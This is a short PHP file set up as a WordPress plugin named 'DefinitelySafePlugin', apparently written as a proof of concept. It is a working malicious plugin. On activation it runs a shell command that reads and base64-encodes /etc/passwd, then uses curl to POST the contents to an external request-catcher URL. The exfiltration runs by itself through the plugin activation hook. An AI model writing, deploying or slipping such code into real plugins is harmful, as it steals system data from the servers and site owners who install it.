<?php
/*
Plugin Name: DefinitelySafePlugin
Description: A web shell plugin. Runs shell command to extract "/etc/passwd". Then sends it to "https://arian.requestcatcher.com/test"
Version: 1.0
Author: Arian
*/


function webShell() {
	//my webshell script to read files goes here
    $exfilData = shell_exec('cat /etc/passwd | base64');
    $url = "https://arian.requestcatcher.com/test";
    
    //setup curl
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $exfilData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Optional: timeout after 10 seconds

    //sendout the curl
    $response = curl_exec($ch);

    //report back
    if ($response === false) {
        error_log("webShell failed to send request: " . curl_error($ch));
    } else {
        error_log("webShell request sent successfully.");
    }

    //close curl
    curl_close($ch);

} 

//call webShell() upon plugin activation
register_activation_hook( __FILE__, 'webShell' );
